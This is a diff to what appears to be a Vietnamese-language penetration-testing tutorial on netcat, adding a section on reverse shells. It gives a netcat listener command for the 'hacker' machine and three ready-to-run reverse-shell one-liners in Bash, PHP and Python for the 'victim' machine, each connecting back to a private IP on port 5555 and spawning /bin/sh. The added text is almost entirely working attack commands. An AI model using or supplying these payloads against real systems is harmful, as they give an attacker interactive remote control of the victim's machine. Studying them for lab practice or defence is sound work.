@@ -64,3 +64,27 @@ Trên máy của hacker
 Trên máy của victim
 
 ![](../images/nc/03.png)
+
+Hoặc ta có thể sử dụng một số lệnh khác để thực hiện reverse shell
+
+Trên máy của hacker chỉ cần dùng lệnh `nc -lvp 5555` để lắng nghe kết nối đến
+
+Trên máy của victim có thể sử dụng một trong các phương pháp sau:
+
+**Bash**
+
+```
+bash -i >& /dev/tcp/10.10.3.1/5555 0>&1
+```
+
+**PHP**
+
+```
+php -r '$sock=fsockopen("10.10.3.1",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+**Python**
+
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.3.5",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
